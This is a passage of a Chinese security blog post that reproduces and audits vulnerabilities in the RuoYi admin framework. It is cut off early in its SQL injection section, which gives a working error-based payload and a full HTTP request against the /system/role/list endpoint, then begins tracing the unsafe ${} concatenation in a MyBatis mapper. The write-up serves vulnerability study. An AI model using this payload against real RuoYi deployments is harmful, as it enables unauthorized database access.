

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
  <link rel="icon" href="/img/candy.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#1b1b26">
  <meta name="author" content="Candy">
  <meta name="keywords" content="">
  
    <meta name="description" content="1 概述1.1 前言在之前尝试挖 src 和 cnvd 的过程中，找到的管理系统，十个里面四个是若依或者若依二开；还有四个是 Jeecg-boot 或者 Jeecg-boot 二开；剩下两个，一个是看来就很难打的系统，另一个是看起来的很垃圾的，即使没有弱口令，在其他地方也能进的感觉； 因此，打算把这两个大框架的漏洞全部复现一下，顺便也深入学习一下代码审计（因为这两个框架都开源嘛，所以深入了解一下漏">
<meta property="og:type" content="article">
<meta property="og:title" content="若依框架全系列漏洞复现与代码审计">
<meta property="og:url" content="http://candyb0x.github.io/2025/08/16/%E8%8B%A5%E4%BE%9D%E6%A1%86%E6%9E%B6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%85%A8%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Welcome Candy Box">
<meta property="og:description" content="1 概述1.1 前言在之前尝试挖 src 和 cnvd 的过程中，找到的管理系统，十个里面四个是若依或者若依二开；还有四个是 Jeecg-boot 或者 Jeecg-boot 二开；剩下两个，一个是看来就很难打的系统，另一个是看起来的很垃圾的，即使没有弱口令，在其他地方也能进的感觉； 因此，打算把这两个大框架的漏洞全部复现一下，顺便也深入学习一下代码审计（因为这两个框架都开源嘛，所以深入了解一下漏">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624497306-5f7b9986-108f-46b1-9e9a-651adec5baca.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624525515-37180bc6-6d9c-423c-afe1-213e6b4c3d08.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624198706-618da339-1494-45a8-8071-53e020705b28.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754625009006-6e108f90-c03d-4681-b3c7-41743bc4cbf6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633892665-c46c20fe-8d9f-4b2d-ba1c-39fe09c99590.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633906695-fa7d2726-c4e6-4a0a-9a76-90282920080d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633853906-d64c4b46-cdb5-4556-bae3-615d0b0b1a1c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634541017-1b2aaeaf-2e9f-4012-9efe-d2f08c4bc8ef.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634514079-d2f7361a-f255-4e52-bdc0-41072be7b8c5.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634473171-c67bc5d6-9f19-4d42-87ff-9ce4c3fbed5b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634717740-33e531a0-0f57-45e3-ac2c-76c8b5d8bd51.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634698973-a4d30ae5-4953-4232-aa6c-b161e2d4797f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634663397-fa811ccd-7514-4f7b-8507-a41c7f41ed0b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754635129514-7b26dc12-8951-4a0e-a60f-90ab79d6fad0.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754635196675-73883f88-8723-4346-977a-7161bb89c526.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754638637997-d67eb89c-90d5-4750-a0cf-1331c49c2b6f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754641429583-1794b68f-1b63-450f-bdf8-e95b51bb3bd6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754641445829-9f0eae2b-146a-4306-81f1-9d7919141c15.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754640934946-9722f587-d554-48df-a758-3c4c3f62f8a4.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658493913-0f14b8e4-9be7-48a4-aa17-1e8d84ecac8a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658521580-efbc864f-a8ef-4e1a-a6bb-13b5c86f9c3d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754658543121-d3bef20c-3f25-4c0c-99d7-7e873f185977.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278172549-c87d9956-25cc-4613-a032-80e79437ef13.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278190843-700d96b7-3cc4-4759-8e8b-a59e34d863e6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755278298486-cce6f9e3-15ea-4747-8d2c-e4aadfcd9bbf.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754656423483-0215f4aa-42f6-42e7-92f9-dcdd57b1685a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754656449028-052bc28a-51f6-4aa1-b645-08281052f25e.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754666886695-bd88f07f-acaf-40df-907a-f675045d5795.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754666961529-228372c3-032f-45ab-ab2a-f1f1017f24d6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754667007773-9703bbba-475d-4a93-921f-f10eacd595fe.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754667141682-b2e2e4a6-1a20-454b-a0c8-4843a1f5e6ee.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654352580-5e038b62-0132-4fed-9e13-3c5ef587f561.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654456752-9d7bb9c0-028d-4c3c-b31f-ba1b64bfaa89.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654483267-03ffc344-abec-4723-80c0-d0dce906a77b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754655349280-dd40bebb-f5f5-45d0-89c7-f1a46edb505c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654521131-bae3195c-0cf3-477c-a4b8-2c4e0ab3b61f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749404476-7b5c0ab8-eb30-41e7-80ad-2ec151b586b1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749478292-ae82a551-84a2-4163-b666-d3e61e5bf528.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749500213-4f106d97-20bf-4989-bb41-6477afa4750a.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749572763-11da9b25-2526-4689-a529-a9bed5a564a1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904759348-7673fd94-148b-4b42-a70e-55da879fb4d0.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904808595-bda62aab-4b2b-445b-8f4d-51a0768b259e.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904840977-6bb2f97c-6e05-4fd1-8388-fe8ea181f511.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904795326-0f91a9ab-b0a9-4212-8c34-ff31209f6583.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309047416-0915e334-d1bc-405a-8f3c-1ca729640f7b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309067494-fb5e97cc-88e1-42a0-a91f-97fa2a72ec2d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309098278-3524e6c2-9d18-4cf5-ab68-a1d32909a5ce.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309690818-abaec647-ccba-4478-a324-8bc827355c08.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309793968-7605ef3a-932f-43a4-8e60-701a1150ddd1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755309832016-d74fb49c-0588-44cc-b735-543ad8a65e71.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755310066758-8a424bd7-7ed1-49ec-8ff3-52159a3b75c9.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755311736878-4a8a2e8a-4d5f-40a9-bd8c-64546446a250.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755311787974-39ee63e3-4f32-4db1-bfce-a4800a832032.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314445005-b9bdd4f9-591b-466f-8457-202acb519a06.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314799178-8a8ed285-b809-431e-84c3-d76ef0165a4c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1755314841264-5926c82d-ee8b-42b4-b411-7c44fc3fc22f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754707935928-0e87f4d1-c276-4a8f-a53f-1c4418845ae2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754707961762-7dc50c21-8171-460c-baf4-a102017a2130.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708037144-7be1dc16-324e-46e2-95cd-231aa27d2458.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708075775-f4a65bae-978d-4c41-934d-86d1a208586f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708167988-0f78dd7b-d930-4b57-8cb4-630c79056511.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708183990-0def1c4c-b106-4ba4-ae7e-dfeb325072c7.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708253245-ea9bc2e7-0bec-4b3d-a912-3fccce1c2b13.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708277321-a00604bd-8199-4078-91f8-3503e93743a1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708679715-5a083bc2-0c82-491f-8303-e7f14c4ff203.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708759501-a920d5de-dc89-4f71-82ad-218a63b72b3b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708826574-2ba596ac-a9b0-4398-8722-fef9253fb612.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754708839413-b5442d18-4029-4b7a-a2bf-5ad38d675950.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754622535752-37948002-934e-41b3-8f10-348cf28974be.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754622570637-5d7f90da-770d-4b81-8f70-57e28cdec03d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754623024675-f05936fd-a9b8-4b90-ac9c-12477d2408f8.png">
<meta property="article:published_time" content="2025-08-16T09:46:35.000Z">
<meta property="article:modified_time" content="2025-08-17T10:06:29.498Z">
<meta property="article:author" content="Candy">
<meta property="article:tag" content="web攻防">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="文件上传">
<meta property="article:tag" content="ruoyi">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624497306-5f7b9986-108f-46b1-9e9a-651adec5baca.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>若依框架全系列漏洞复现与代码审计 - Welcome Candy Box</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Candy</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/essay/" target="_self">
                <i class="iconfont icon-note"></i>
                <span>随笔</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="若依框架全系列漏洞复现与代码审计"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Candy
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-08-16 17:46" pubdate>
          2025年8月16日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          12k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          103 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">若依框架全系列漏洞复现与代码审计</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h1><h2 id="1-1-前言"><a href="#1-1-前言" class="headerlink" title="1.1 前言"></a>1.1 前言</h2><p>在之前尝试挖 src 和 cnvd 的过程中，找到的管理系统，十个里面四个是若依或者若依二开；还有四个是 Jeecg-boot 或者 Jeecg-boot 二开；剩下两个，一个是看来就很难打的系统，另一个是看起来的很垃圾的，即使没有弱口令，在其他地方也能进的感觉；</p>
<p>因此，打算把这两个大框架的漏洞全部复现一下，顺便也深入学习一下代码审计（因为这两个框架都开源嘛，所以深入了解一下漏洞成因）；</p>
<p>本次用来进行漏洞复现的若依主要是4.5.0、4.6.0、4.7.0、4.7.1、4.7.2、4.7.8、4.8.0 几个版本进行测试；</p>
<p>java 版本使用的是 jdk1.8.0_121，主要是为了远程 jndi 注入的实现；</p>
<h2 id="1-2-简介"><a href="#1-2-简介" class="headerlink" title="1.2 简介"></a>1.2 简介</h2><p>Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。</p>
<p>若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。</p>
<h1 id="2-SQL-注入漏洞"><a href="#2-SQL-注入漏洞" class="headerlink" title="2 SQL 注入漏洞"></a>2 SQL 注入漏洞</h1><h2 id="2-1-注入点-role-list接口（"><a href="#2-1-注入点-role-list接口（" class="headerlink" title="2.1 注入点/role/list接口（&lt;V4.6.2）"></a>2.1 注入点<code>/role/list</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624497306-5f7b9986-108f-46b1-9e9a-651adec5baca.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624525515-37180bc6-6d9c-423c-afe1-213e6b4c3d08.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>201<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/role<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=eaeb8b8f-7702-4f7e-ab5f-767d916498d1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">pageSize</span>=<span class="hljs-number">10</span>&amp;pageNum=<span class="hljs-number">1</span>&amp;orderByColumn=roleSort&amp;isAsc=asc&amp;roleName=&amp;roleKey=&amp;status=&amp;params%<span class="hljs-number">5</span>BbeginTime%<span class="hljs-number">5</span>D=&amp;params%<span class="hljs-number">5</span>BendTime%<span class="hljs-number">5</span>D=&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754624198706-618da339-1494-45a8-8071-53e020705b28.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><blockquote>
<p>这里我们采用漏洞挖掘的思想进行漏洞分析</p>
</blockquote>
<p>在 MyBatis 配置中一般使用<code>#&#123;&#125;</code>实现类似预编译PreparedStatement 的占位效果，传入内容会进行相应的转义，可以用来防止 SQL 注入。</p>
<p>当 MyBatis 配置中采用<code>$&#123;&#125;</code>方式则是通过拼接字符串的形式构成 SQL 语句进行执行，容易产生 SQL 注入；</p>
<p>对于漏洞挖掘，首先需要找到的是容易产生 SQL 注入的点，也就是使用<code>$&#123;&#125;</code>进行拼接的 sql 语句，引入直接定位指定的文件掩码<code>*.xml</code>，并且使用关键字符进行搜索，如<code>$&#123;</code>或者正则搜索；</p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754625009006-6e108f90-c03d-4681-b3c7-41743bc4cbf6.png" srcset="/img/loading.gif" lazyload></p>
<p>定位到一个容易产生 SQL 注入的 MyBatis 配置，位于<code>RuoYi-4.6.0\ruoyi-system\src\main\resources\mapper\system\SysRoleMapper.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectRoleList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysRole&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysRoleResult&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">refid</span>=<span class="hljs-string">&quot;selectRoleContactVo&quot;</span>/&gt;</span><br>  where r.del_flag = &#x27;0&#x27;<br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;roleName != null and roleName != &#x27;&#x27;&quot;</span>&gt;</span><br>    AND r.role_name like concat(&#x27;%&#x27;, #&#123;roleName&#125;, &#x27;%&#x27;)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span><br>    AND r.status = #&#123;status&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;roleKey != null and roleKey != &#x27;&#x27;&quot;</span>&gt;</span><br>    AND 